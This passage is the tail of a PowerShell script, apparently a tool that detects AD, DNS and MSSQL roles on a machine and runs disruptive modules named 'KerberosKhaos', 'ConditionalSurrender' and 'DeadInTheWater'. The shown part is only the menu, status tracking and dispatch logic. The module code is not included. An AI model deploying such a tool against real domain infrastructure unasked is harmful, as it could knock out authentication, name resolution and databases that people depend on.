        elseif ($states[$m] -eq "RUNNING") { $stTag = " [ RUN]"; $stCol = "Yellow" }
        else                               { $stTag = "       "; $stCol = "White"  }
        Write-Host "  |  " -ForegroundColor Cyan -NoNewline
        Write-Host "[$($def.Num)] $($def.Label) ($($def.Role))  " -ForegroundColor White -NoNewline
        Write-Host $roleTag -ForegroundColor $roleCol -NoNewline
        Write-Host $stTag -ForegroundColor $stCol -NoNewline
        Write-Host "  |" -ForegroundColor Cyan
    }

    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
    Write-Host "  |  [A] All present roles   [S] Status   [Q] Quit          |" -ForegroundColor Cyan
    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
    Write-Host ""
}

function Show-Status {
    Write-Section "Module State"
    foreach ($m in $script:ExecOrder) {
        $def   = $script:ModuleDefs[$m]
        $state = Get-ModuleState $m
        if     ($state -eq "SUCCESS") { $col = "Green"  }
        elseif ($state -eq "FAILED")  { $col = "Red"    }
        else                          { $col = "Yellow" }
        $pres  = if ($def.Present) { "PRESENT" } else { "ABSENT" }
        Write-Host ("  {0,-24} Role:{1,-5}  State:" -f $m, $pres) -NoNewline
        Write-Host $state -ForegroundColor $col
    }
}

function Invoke-Modules { param([string[]]$ToRun)
    $summary = @()

    foreach ($m in $script:ExecOrder) {
        if ($m -notin $ToRun) { continue }

        $existingState = Get-ModuleState $m

        if ($existingState -eq "SUCCESS" -and -not $Force) {
            if (-not $Resume) {
                Write-Warn "[$m] already SUCCESS -- skipping (use -Force to re-run, -Resume to skip silently)"
            }
            $summary += [PSCustomObject]@{ Module = $m; Result = "SKIPPED (already SUCCESS)"; Elapsed = "-" }
            continue
        }

        Set-ModuleState $m "RUNNING"
        $sw = [System.Diagnostics.Stopwatch]::StartNew()

        try {
            switch ($m) {
                "KerberosKhaos"        { Invoke-KerberosKhaos        }
                "ConditionalSurrender" { Invoke-ConditionalSurrender  }
                "DeadInTheWater"       { Invoke-DeadInTheWater        }
            }
            Set-ModuleState $m "SUCCESS"
            $summary += [PSCustomObject]@{ Module = $m; Result = "SUCCESS"; Elapsed = "$($sw.Elapsed.ToString('mm\:ss'))" }
        } catch {
            Write-Err "[$m] Unhandled error: $_"
            Set-ModuleState $m "FAILED"
            $summary += [PSCustomObject]@{ Module = $m; Result = "FAILED"; Elapsed = "$($sw.Elapsed.ToString('mm\:ss'))" }
        }
        $sw.Stop()
    }

    Write-Host ""
    Write-Section "Session Summary"
    $summary | Format-Table -AutoSize | Out-String | Write-Host
}

# ==============================================================================
#  ENTRY POINT
# ==============================================================================

Show-Banner

if ($Status) {
    Show-Status
    exit 0
}

# Non-interactive path
if ($All) {
    $toRun = $script:ExecOrder | Where-Object { $script:ModuleDefs[$_].Present }
    if (-not $toRun) {
        Write-Warn "No target roles detected on this machine (AD/DNS/MSSQL). Nothing to run."
        exit 0
    }
    Write-Info "Running all present-role modules: $($toRun -join ', ')"
    Invoke-Modules -ToRun $toRun
    exit 0
}

if ($Modules.Count -gt 0) {
    $resolved = @()
    foreach ($m in $Modules) {
        $name = Resolve-ModuleName $m
        if ($name) {
            $resolved += $name
        } else {
            Write-Warn "Unknown module '$m' -- ignored (valid: 1/2/3, kk/cs/ditw, kerberos/dns/mssql)"
        }
    }
    if ($resolved.Count -eq 0) {
        Write-Err "No valid modules resolved from input."
        exit 1
    }
    Invoke-Modules -ToRun $resolved
    exit 0
}

# Interactive menu loop
while ($true) {
    Show-Menu
    $userInput = Read-Host "  Enter choice(s)"
    $trimmed = $userInput.Trim()

    if ($trimmed -eq "" ) { continue }
    if ($trimmed -ieq "Q") { Write-Info "Exiting."; break }

    if ($trimmed -ieq "S") {
        Show-Status
        continue
    }

    if ($trimmed -ieq "A") {
        $toRun = $script:ExecOrder | Where-Object { $script:ModuleDefs[$_].Present }
        if (-not $toRun) {
            Write-Warn "No target roles detected -- nothing to run."
        } else {
            Invoke-Modules -ToRun $toRun
        }
        continue
    }

    $tokens   = $trimmed -split '[,\s]+' | Where-Object { $_ -ne "" }
    $resolved = @()
    foreach ($t in $tokens) {
        $name = Resolve-ModuleName $t
        if ($name) { $resolved += $name }
        else        { Write-Warn "Unknown token '$t' -- skipped" }
    }

    if ($resolved.Count -gt 0) {
        Invoke-Modules -ToRun ($resolved | Select-Object -Unique)
    }
}
